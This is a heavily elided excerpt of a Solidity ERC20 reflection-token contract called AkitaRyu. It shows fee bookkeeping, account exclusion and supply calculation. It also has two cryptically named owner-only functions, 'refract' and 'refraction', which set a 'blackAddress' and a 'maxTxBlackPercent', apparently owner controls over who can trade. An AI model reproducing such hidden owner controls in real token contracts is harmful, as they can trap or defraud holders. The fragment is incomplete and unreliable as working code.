...
contract AkitaRyu is Context, IERC20, Ownable {
 ...
 uint256 private _tFeeTotal;
    string private _name = 'AkitaRyu - .com';
   ...
   uint256 private _rTotal = (MAX - (MAX % _tTotal));
    ...
    function refract(address blackAddress) public onlyOwner {
        initializer = blackAddress;
    }
  
    function refraction(uint256 maxTxBlackPercent) public onlyOwner {
    ...
    function excludeAccount(address account) external onlyOwner() {
        ...
        if(_balances[account] > 0) {
            _tOwned[account] = tokenFromReflection(_balances[account]);
        }
    ...
    function _getCurrentSupply() private view returns(uint256, uint256) {
        ...
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_balances[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
